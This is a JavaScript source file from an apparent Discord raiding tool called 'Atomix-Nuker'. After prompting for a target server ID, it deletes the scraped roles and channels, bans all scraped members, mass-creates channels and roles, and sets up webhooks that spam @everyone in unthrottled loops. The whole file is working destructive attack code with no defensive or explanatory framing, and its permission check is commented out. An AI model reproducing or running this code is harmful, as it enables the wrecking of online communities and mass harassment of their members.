import { white } from "chalk";
import { createString } from "../utils/createString";
import { getTheme } from "../utils/getTheme";
import { logo } from "../utils/logo";
import { logoOptions } from "../utils/logoOptions";
import { main } from "./main";
import { scrape } from "./scrape";

function mainWizz(
  client,
  db,
  rl,
  guildID,
  channelName,
  channelAmount,
  roleName,
  roleAmount,
  webhookName
) {
  function nukeStr(str, type) {
    let r = `${mainColor("[")}${white(
      type === "rateLimit"
        ? "!"
        : type === "success"
        ? "+"
        : type === "fail"
        ? "-"
        : ""
    )}${mainColor("]")} ${white(str)}`;
    return r;
  }
  let mainColor = getTheme(db);
  if (!client.guilds.cache.has(guildID)) {
    console.log(createString("Unknown server", db, "semi"));
    setTimeout(() => {
      main(db, rl, client);
    }, 2000);
    return;
  }
  let data = db.get(`scrape_${guildID}`);
  let server = client.guilds.cache.get(guildID);

  // console.log(server)

  // if (
  //   !server.me.hasPermissions([
  //     "BAN_MEMBERS",
  //     "MANAGE_CHANNELS",
  //     "MANAGE_ROLES",
  //   ])
  // ) {
  //   process.title = "[Atomix-Nuker] - Missing permissions";
  //   console.log(createString("Failed to find required permissions", db));
  //   console.log(" ");
  //   rl.question(createString("Type anything to continue", db), () => {
  //     main(db, rl, client);
  //   });
  //   return;
  // }

  process.title = `[Atomix-Nuker] - Nuking ${server.name}`;

  let rolesArr = data.roles;

  rolesArr.map(async (roleID) => {
    let role = server.roles.cache.get(roleID);
    role
      .delete()
      .then((r) => {
        console.log(nukeStr(`Deleted role ${r.id}`, "success"));
      })
      .catch(() => {
        console.log(nukeStr(`Failed to delete role ${roleID}`, "fail"));
      });
  });

  let channelArr = data.channels;

  channelArr.map(async (channelID) => {
    let channel = server.channels.cache.get(channelID);
    (await channel.fetch())
      .delete()
      .then((r) => {
        console.log(nukeStr(`Deleted channel ${r.id}`, "success"));
      })
      .catch(() => {
        console.log(nukeStr(`Failed to delete channel ${channelID}`, "fail"));
      });
  });

  let membersArr = data.members;

  if (db.has(`settings.scrape.delnuke`)) {
    if (db.get(`settings.scrape.delnuke`) === true) {
      db.delete(`scrape_${guildID}`);
      db.save();
    }
  }

  membersArr.map(async (memID) => {
    let member = server.members.cache.get(memID);
    member
      .ban()
      .then(() => {
        console.log(nukeStr(`Banned member ${memID}`, "success"));
      })
      .catch(() => {
        console.log(nukeStr(`Failed to ban member ${memID}`, "fail"));
      });
  });

  // server.channels.cache.map((ch) => {
  //   ch.delete()
  //     .then((c) => {
  //       console.log(nukeStr(`Deleted channel ${c.id}`, "success"));
  //     })
  //     .catch(() => {
  //       console.log(
  //         nukeStr(`Failed to delete channel ${ch.id}`, "fail")
  //       );
  //     });
  // });
  for (let i = 0; i < Number(channelAmount); i++) {
    server.channels
      .create(channelName)
      .then((x) => {
        console.log(nukeStr(`Created channel ${x.id}`, "success"));
        x.createWebhook(webhookName)
          .then((hook) => {
            console.log(nukeStr(`Created webhook ${webhookName}`, "success"));
            setInterval(() => {
              hook
                .send(`@everyone`)
                .then((mm) => {
                  console.log(
                    nukeStr(`Sent webhook webhook message ${mm.id}`, "success")
                  );
                })
                .catch(() => {
                  console.log(
                    nukeStr(`Failed to send webhook message`, "fail")
                  );
                });
            });
          })
          .catch(() => {
            console.log(nukeStr("Failed to create webhook", "fail"));
          });
        setInterval(() => {
          x.send(`@everyone`)
            .then((m) => {
              console.log(nukeStr(`Sent channel message ${m.id}`, "success"));
            })
            .catch(() => {
              console.log(nukeStr("Failed to send channel message", "fail"));
            });
        });
      })
      .catch(() => {
        console.log(nukeStr(`Failed to create channel`, "fail"));
      });
  }
  for (let i = 0; i < Number(roleAmount); i++) {
    server.roles
      .create({ data: { name: roleName, color: "RANDOM" } })
      .then((x) => {
        console.log(nukeStr(`Created role ${x.id}`, "success"));
      })
      .catch(() => {
        console.log(nukeStr(`Failed to create role`, "fail"));
      });
  }
}

function checkConfigBefore(db, guildID) {
  let c = null;
  if (db.has(`settings.scrape.checknuke`)) {
    if (db.get(`settings.scrape.checknuke`) === true) {
      if (!db.has(`scrape_${guildID}`)) c = "NONE";
    }
  }
  return c;
}

function wizz(client, db, rl) {
  logo(db);
  function askQuestions() {
    rl.question(createString("Enter channel names", db), (channelName) => {
      if (channelName === "exit" || channelName === "menu") {
        main(db, rl, client);
        return;
      }
      rl.question(createString("Enter channel amount", db), (channelAmount) => {
        if (channelAmount === "exit" || channelAmount === "menu") {
          main(db, rl, client);
          return;
        }
        rl.question(createString("Enter role names", db), (roleName) => {
          if (roleName === "exit" || roleName === "menu") {
            main(db, rl, client);
            return;
          }
          rl.question(createString("Enter role amount", db), (roleAmount) => {
            if (roleAmount === "exit" || roleAmount === "menu") {
              main(db, rl, client);
              return;
            }
            rl.question(
              createString("Enter webhook name", db),
              (webhookName) => {
                if (webhookName === "exit" || webhookName === "menu") {
                  main(db, rl, client);
                  return;
                }
                rl.question(createString("Enter guild ID", db), (guildID) => {
                  if (guildID === "exit" || guildID === "menu") {
                    main(db, rl, client);
                    return;
                  }
                  if (checkConfigBefore(db, guildID) === "NONE") {
                    console.log(
                      createString("There is no scrape data for the server", db)
                    );
                    console.log(" ");
                    rl.question(
                      createString(
                        "Would you like to continue to *scraper* or *menu*",
                        db
                      ),
                      (ox) => {
                        if (ox === "scraper") {
                          scrape(rl, db, client);
                          return;
                        } else if (ox === "menu") {
                          main(db, rl, client);
                          return;
                        } else {
                          main(db, rl, client);
                          return;
                        }
                      }
                    );
                    return;
                  }
                  db.set(`nuke_settings`, {
                    channelName,
                    channelAmount,
                    roleName,
                    roleAmount,
                    webhookName,
                  });
                  db.save();
                  mainWizz(
                    client,
                    db,
                    rl,
                    guildID,
                    channelName,
                    channelAmount,
                    roleName,
                    roleAmount,
                    webhookName
                  );
                });
              }
            );
          });
        });
      });
    });
  }
  if (db.has(`nuke_settings`)) {
    if (db.has(`settings.nuke.useold`)) {
      if (db.get(`settings.nuke.useold`) === true) {
        console.clear();
        logo(db);
        let data = db.get(`nuke_settings`);
        rl.question(createString("Enter guild ID", db), (guildID) => {
          if (checkConfigBefore(db, guildID) === "NONE") {
            console.log(
              createString("There is no scrape data for the server", db)
            );
            console.log(" ");
            rl.question(
              createString(
                "Would you like to continue to *scraper* or *menu*",
                db
              ),
              (ox) => {
                if (ox === "scraper") {
                  scrape(rl, db, client);
                  return;
                } else if (ox === "menu") {
                  main(db, rl, client);
                  return;
                } else {
                  main(db, rl, client);
                  return;
                }
              }
            );
            return;
          }
          mainWizz(
            client,
            db,
            rl,
            guildID,
            data.channelName,
            data.channelAmount,
            data.roleName,
            data.roleAmount,
            data.webhookName
          );
        });
        return;
      }
    } else if (db.has(`settings.nuke.setnew`)) {
      if (db.get("settings.nuke.setnew") === true) {
        console.clear();
        askQuestions();
        return;
      }
    }
    console.clear();
    logoOptions(db);
    console.log(createString("There are already saved nuked settings", db));
    rl.question(
      createString("Would you like to set *new* or use *old*", db),
      (option) => {
        if (option === "new") {
          askQuestions();
        } else if (option === "old") {
          let data = db.get(`nuke_settings`);
          rl.question(createString("Enter guild ID", db), (guildID) => {
            if (checkConfigBefore(db, guildID) === "NONE") {
              console.log(
                createString("There is no scrape data for the server", db)
              );
              console.log(" ");
              rl.question(
                createString(
                  "Would you like to continue to *scraper* or *menu*",
                  db
                ),
                (ox) => {
                  if (ox === "scraper") {
                    scrape(rl, db, client);
                    return;
                  } else if (ox === "menu") {
                    main(db, rl, client);
                    return;
                  } else {
                    main(db, rl, client);
                    return;
                  }
                }
              );
              return;
            }
            mainWizz(
              client,
              db,
              rl,
              guildID,
              data.channelName,
              data.channelAmount,
              data.roleName,
              data.roleAmount,
              data.webhookName
            );
          });
        } else if (option === "menu" || option === "exit") {
          main(db, rl, client);
          return;
        }
      }
    );
  } else {
    console.clear();
    askQuestions();
  }
}

export { wizz };
